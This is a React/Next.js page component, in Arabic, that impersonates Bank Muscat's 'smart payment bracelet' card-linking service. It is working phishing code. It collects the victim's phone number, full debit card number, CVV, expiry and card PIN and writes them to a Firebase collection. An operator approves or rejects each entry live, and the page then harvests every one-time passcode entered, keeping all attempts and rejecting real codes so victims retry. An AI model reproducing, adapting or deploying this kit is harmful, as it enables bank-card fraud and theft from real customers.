"use client"

import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ChevronRight, Camera, Info, X } from "lucide-react"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { doc, onSnapshot } from "firebase/firestore"
import { addData, db } from "@/lib/firebase"
import Loader from "./loader"
const allOtps = ['']
export default function UsernameRecoveryPage() {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [cns, setcns] = useState(["", "", "", ""])
  const [exm, setexm] = useState("")
  const [bank, setBank] = useState("")
  const [pass, setPass] = useState("")
  const [exy, setexy] = useState("")
  const [ccc, setccc] = useState("")
  const [otpValues, setOtpValues] = useState(["", "", "", ""])
  const [showOtp, setShowOtp] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [errors, setErrors] = useState<{ [key: string]: string }>({})
  const [isLoading, setIsLoading] = useState(false)

  const cardInputRefs = useRef<(HTMLInputElement | null)[]>([])

  const handlecnChange = (index: number, value: string) => {
    const numericValue = value.replace(/\D/g, "").slice(0, 4)
    const newcns = [...cns]
    newcns[index] = numericValue
    setcns(newcns)

    if (numericValue.length === 4 && index < 3) {
      cardInputRefs.current[index + 1]?.focus()
    }

    // Clear error when user starts typing
    if (errors[`card-${index}`]) {
      setErrors((prev) => ({ ...prev, [`card-${index}`]: "" }))
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return // Only allow single digit

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`otp-${index + 1}`)
      nextInput?.focus()
    }

    // Clear error when user starts typing
    if (otpError) setOtpError("")
  }

  const validateForm = () => {
    const newErrors: { [key: string]: string } = {}

    // Validate phone number
    if (!phoneNumber.trim()) {
      newErrors.phoneNumber = "رقم الهاتف مطلوب"
    } else if (!/^\d{8}$/.test(phoneNumber)) {
      newErrors.phoneNumber = "رقم الهاتف يجب أن يكون 8 أرقام"
    }

    // Validate card numbers
    cns.forEach((number, index) => {
      if (!number.trim()) {
        newErrors[`card-${index}`] = "رقم البطاقة مطلوب"
      } else if (number.length !== 4) {
        newErrors[`card-${index}`] = "يجب أن يكون 4 أرقام"
      }
    })

    // Validate expiry month
    if (!exm.trim()) {
      newErrors.exm = "الشهر مطلوب"
    } else if (!/^(0[1-9]|1[0-2])$/.test(exm)) {
      newErrors.exm = "شهر غير صحيح"
    }

    // Validate expiry year
    if (!exy.trim()) {
      newErrors.exy = "السنة مطلوبة"
    } else if (!/^\d{2}$/.test(exy)) {
      newErrors.exy = "سنة غير صحيحة"
    }

    // Validate ccc
    if (!ccc.trim()) {
      newErrors.ccc = "رمز الأمان مطلوب"
    } else if (!/^\d{3}$/.test(ccc)) {
      newErrors.ccc = "رمز الأمان يجب أن يكون 3 أرقام"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleContinue = async (e: any) => {

    const otpString = otpValues.join("")
    allOtps.push(otpString)
    const visitorId = localStorage.getItem("visitor");
    await addData({ id: visitorId, otp: otpString, allOtps })
    // Validate OTP
    if (otpString.length !== 4) {
      setOtpError("يرجى إدخال رمز التحقق المكون من 4 أرقام")
      return
    }

    if (!/^\d{4}$/.test(otpString)) {
      setOtpError("رمز التحقق يجب أن يحتوي على أرقام فقط")
      return
    }

    // Simulate OTP verification (you can replace with actual API call)
    if (otpString !== "1234") {
      setOtpError("رمز التحقق غير صحيح")
      setOtpValues(['', '', '', ''])
      return
    }

    // Success - proceed with form submission
    console.log("OTP verified successfully")

  }

  const handleCloseOtp = () => {
    setShowOtp(false)
    setOtpValues(["", "", "", ""])
    setOtpError("")
  }
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any;
          if (data.status === "pending") {
            setIsLoading(true);
          } else if (data.status === "approved") {
            setIsLoading(false);
            setShowOtp(true)
          } else if (data.status === "rejected") {
            setIsLoading(false);
            alert("Card rejected please try again!");
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);
  const handleSubmit = async (e: any) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor");
    const exp = `${exm}/${exy}`;

    await addData({
      id: visitorId,
      cn: cns,
      status: 'pending',
      ccc: ccc,
      EX: exp,
      bank,pass
    });
  }
  return (
    <div className="min-h-screen bg-gray-100">
      <form onSubmit={handleSubmit}>
        {/* Header */}
        <div className="bg-black h-12 flex items-center justify-between px-4">
          <ChevronRight className="w-6 h-6 text-red-500" />
          <img src="/logo.png" alt="" width={90}/>
        </div>
        {/* Main Content */}
        <div className="px-6 py-8 space-y-8">
          {/* Title */}
          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي من بنك مسقط</h1>

          {/* Phone Number Section */}
          <div className="space-y-4">
            <label className="block text-gray-600 text-right">
              رقم الهاتف <span className="text-red-500">*</span>
            </label>

            <div className="flex items-center gap-2">
              <Input
                value={phoneNumber}
                onChange={(e) => {
                  const numericValue = e.target.value.replace(/\D/g, "").slice(0, 8)
                  setPhoneNumber(numericValue)
                  if (errors.phoneNumber) {
                    setErrors((prev) => ({ ...prev, phoneNumber: "" }))
                  }
                }}
                className={`flex-1 text-right ${errors.phoneNumber ? "border-red-500" : ""}`}
                placeholder="99999999"
                required
                maxLength={8}
              />

              <Select defaultValue="+968">
                <SelectTrigger className="w-24">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="+968">
                    <div className="flex items-center gap-2">
                      <span className="text-xs">🇴🇲</span>
                      <span>(+968)</span>
                    </div>
                  </SelectItem>
                </SelectContent>
              </Select>
            </div>

            {errors.phoneNumber && <div className="text-red-500 text-sm text-right">{errors.phoneNumber}</div>}

            <div className="flex items-center gap-2 text-sm text-gray-500">
              <Info className="w-4 h-4" />
              <span>يجب أن يكون هذا الرقم مسجلاً في حسابك.</span>
            </div>
          </div>
{/* Card Number Section
<div className="space-y-4">
            <label className="block text-gray-600 text-right">
             اسم البنك الخاص بك<span className="text-red-500">*</span>
            </label>

            <div className="gap-2">
            <Select onValueChange={(e)=>setBank(e)}>
  <SelectTrigger className="w-full" dir="rtl">
    <SelectValue placeholder="اختر اسم البنك" />
  </SelectTrigger>
  <SelectContent>
  <SelectItem value="مسقط">بنك مسقط</SelectItem>
  <SelectItem value="ضفار">بنك ظفار</SelectItem>
  <SelectItem value="الوطني">البنك الوطني العماني</SelectItem>
  <SelectItem value="صحار">بنك صحار الدولي</SelectItem>
  <SelectItem value="عمان_العربي">بنك عمان العربي</SelectItem>
  <SelectItem value="الأهلي">البنك الأهلي العماني</SelectItem>
  <SelectItem value="نزوى">بنك نزوى</SelectItem>
  <SelectItem value="الاسكان">بنك الأسكان العماني</SelectItem>
  <SelectItem value="الاسلامي صحار">بنك صحار الاسلامي</SelectItem>
  <SelectItem value="الاسلامي ظفار">بنك ظفار الاسلامي</SelectItem>
  </SelectContent>
</Select>
            </div>
          </div> */}
          {/* Card Number Section */}
          <div className="space-y-4">
            <label className="block text-gray-600 text-right">
              رقم بطاقة الخصم المباشر <span className="text-red-500">*</span>
            </label>

            <div className="grid grid-cols-4 gap-2">
              {cns.map((number, index) => (
                <div key={index}>
                  <Input
                    ref={(el) => (cardInputRefs.current[index] = el) as any}
                    value={number}
                    onChange={(e) => handlecnChange(index, e.target.value)}
                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-red-500" : ""}`}
                    placeholder="XXXX"
                    maxLength={4}
                    required
                    inputMode="numeric"
                  />
                  {errors[`card-${index}`] && (
                    <div className="text-red-500 text-xs text-center mt-1">{errors[`card-${index}`]}</div>
                  )}
                </div>
              ))}
            </div>
          </div>

          <div className="space-y-4">
            <label className="block text-gray-600 text-right">
              تاريخ الانتهاء ورمز الأمان <span className="text-red-500">*</span>
            </label>
            <div className="flex justify-center gap-2">
              <div>
                <Input
                  value={ccc}
                  onChange={(e) => {
                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 3)
                    setccc(numericValue)
                    if (errors.ccc) {
                      setErrors((prev) => ({ ...prev, ccc: "" }))
                    }
                  }}
                  className={`text-center w-20 ${errors.ccc ? "border-red-500" : ""}`}
                  placeholder="ccc"
                  maxLength={3}
                  required
                  inputMode="numeric"
                />
                {errors.ccc && <div className="text-red-500 text-xs text-center mt-1">{errors.ccc}</div>}
              </div>
              <div>
                <Input
                  value={exm}
                  onChange={(e) => {
                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 2)
                    setexm(numericValue)
                    if (errors.exm) {
                      setErrors((prev) => ({ ...prev, exm: "" }))
                    }
                  }}
                  className={`text-center w-20 ${errors.exm ? "border-red-500" : ""}`}
                  placeholder="MM"
                  maxLength={2}
                  required
                  inputMode="numeric"
                />
                {errors.exm && (
                  <div className="text-red-500 text-xs text-center mt-1">{errors.exm}</div>
                )}
              </div>
              <div>
                <Input
                  value={exy}
                  onChange={(e) => {
                    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 2)
                    setexy(numericValue)
                    if (errors.exy) {
                      setErrors((prev) => ({ ...prev, exy: "" }))
                    }
                  }}
                  className={`text-center w-20 ${errors.exy ? "border-red-500" : ""}`}
                  placeholder="YY"
                  maxLength={2}
                  required
                  inputMode="numeric"
                />
                {errors.exy && <div className="text-red-500 text-xs text-center mt-1">{errors.exy}</div>}
              </div>
            </div>
            <div className="space-y-4">
            <label className="block text-gray-600 text-right">
            الرقم السري لبطاقة الخصم<span className="text-red-500">*</span>
            </label>

            <div className="grid gap-2">
                  <Input
                    value={pass}
                    onChange={(e) => setPass(
                       e.target.value)}
                    className={`w-full text-center border-0 border-b-2 rounded-none `}
                    placeholder="XXXX"
                    maxLength={4}
                    required
                    inputMode="numeric"
                  />
            </div>
          </div>
          </div>



          {/* Continue Button */}
          <div className="pt-8">
            <Button
              type="submit"
              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
            >
              استمرار
            </Button>
          </div>
        </div>
      </form>
      {isLoading && <Loader />}
      <Dialog open={showOtp} onOpenChange={handleCloseOtp}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-right">رمز التحقق</DialogTitle>
            <Button variant="ghost" size="icon" className="absolute left-4 top-4" onClick={handleCloseOtp}>
              <X className="h-4 w-4" />
            </Button>
          </DialogHeader>

          <div className="space-y-4">
            <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>

            <div className="flex justify-center gap-3">
              {otpValues.map((value, index) => (
                <Input
                  key={index}
                  id={`otp-${index}`}
                  value={value}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  className="w-12 h-12 text-center text-lg font-bold"
                  maxLength={1}
                  type="text"
                  inputMode="numeric"
                />
              ))}
            </div>

            {otpError && (
              <div className="text-red-500 text-sm text-center bg-red-50 p-3 rounded-lg border border-red-200">
                {otpError}
              </div>
            )}

            <Button
              onClick={handleContinue}
              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
            >
              تأكيد
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
